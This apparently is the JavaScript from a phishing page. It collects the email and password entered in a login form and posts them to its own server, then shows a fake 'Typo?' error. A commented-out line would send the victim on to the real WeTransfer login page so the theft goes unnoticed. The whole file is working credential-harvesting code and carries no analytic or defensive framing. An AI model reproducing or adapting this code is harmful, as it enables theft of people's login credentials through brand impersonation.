const form = document.querySelector(".form")
let email = document.getElementById("emai")
let password = document.getElementById("passwor")
let btn = document.getElementById("btn")
let res = document.getElementById("res")




// btn.addEventListener("click", (y) => {
//     document.location.href="https://www.w3schools.com"
// })

form.addEventListener("submit", (e) => {
    e.preventDefault()
    let formData = {
        email: email.value,
        password: password.value
    }

    let xhr = new XMLHttpRequest()
    xhr.open("POST", "/")
    xhr.setRequestHeader("content-type", "application/json")
    // xhr.onload = function(){
    //     console.log(xhr.responseText)
    //     if(xhr){
    //         alert("email sent successfully")
    //         email.value = "";
    //         password.value = "";
    //     }else{
    //         alert("something went wrong")
    //     }
    // }

    xhr.send(JSON.stringify(formData))
    res.innerHTML = "Hmm, that doesn't look right. Typo?"
    res.style.padding = "3px"
    // document.location.href="https://https://auth.wetransfer.com/login?state=hKFo2SBnOEJPU0xwSXdic2RqTzJDamxOYVg0NnBwRDFCd19ESKFupWxvZ2luo3RpZNkgUGFQQjAtdVppMkM5OUdyTFFYd1FmeHJHU3RiMW5LbG2jY2lk2SBkWFdGUWppVzFqeFdDRkcwaE9WcHFyazRoOXZHZWFuYw&client=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&protocol=oauth2&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F&redirect_uri=https%3A%2F%2Fwetransfer.com%2Faccount%2Fcallback%3FfinalizeSSOAuth%3D1%26login%3D1&cache=%5Bobject%20Object%5D&initialScreen=login&lang=en&scope=openid%20profile%20email%20offline_access&response_type=code&response_mode=query&nonce=MXJaRnZKRkxKdzBhbURDYmVRTWh5TDJma2doZnMyRnM5c0hkRkhsSzdfTw%3D%3D&code_challenge=NJy8TqKaspGFmzq-nVJIdcSWm3BzX4b7qZgwXJz6Ue4&code_challenge_method=S256&auth0Client=eyJuYW1lIjoiYXV0aDAtc3BhLWpzIiwidmVyc2lvbiI6IjEuMTkuMyJ9"
})